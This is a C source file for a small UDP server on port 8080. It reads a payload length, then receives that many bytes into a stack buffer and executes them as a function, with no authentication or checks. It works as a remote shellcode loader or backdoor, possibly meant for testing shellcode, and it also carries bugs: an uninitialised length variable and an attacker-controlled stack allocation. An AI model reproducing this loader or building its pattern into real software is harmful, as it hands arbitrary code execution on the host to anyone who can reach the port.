#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PORT 8080

void _memset(void * dest, register int c, register size_t len)
{
	register unsigned char *ptr = (unsigned char*)dest;
  	while (len-- > 0)
    	*ptr++ = c;
}

int main(int argc, char const *argv[])
{
	struct sockaddr_in servaddr, cliaddr; 
	int sock, payloadLen, len, ret;
	char buffer[32];
	int (*f)(void);

	sock = socket(AF_INET, SOCK_DGRAM, 0);
	if(sock < 0)
	{
		printf("Error in socket creation\n");
		return 1;
	}

	_memset(&servaddr, 0, sizeof(servaddr));
	_memset(&cliaddr, 0, sizeof(cliaddr));

	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = INADDR_ANY;
	servaddr.sin_port = htons(PORT);

	if(bind(sock, (const struct sockaddr *) &servaddr, sizeof(servaddr)) < 0)
	{
		printf("Bind failed\n");
		return 1;
	}

	recvfrom(sock, buffer, 32, 0, ( struct sockaddr *) &cliaddr, &len);
	payloadLen = atoi(buffer);
	printf("Payload length: %d\n", payloadLen);

	char payload[payloadLen];
	recvfrom(sock, payload, payloadLen, 0, ( struct sockaddr *) &cliaddr, &len);
	printf("Payload received\n");

	f = (int(*)(void)) payload;
	ret = f();

	printf("Return: %d\n", ret);



	return 0;
}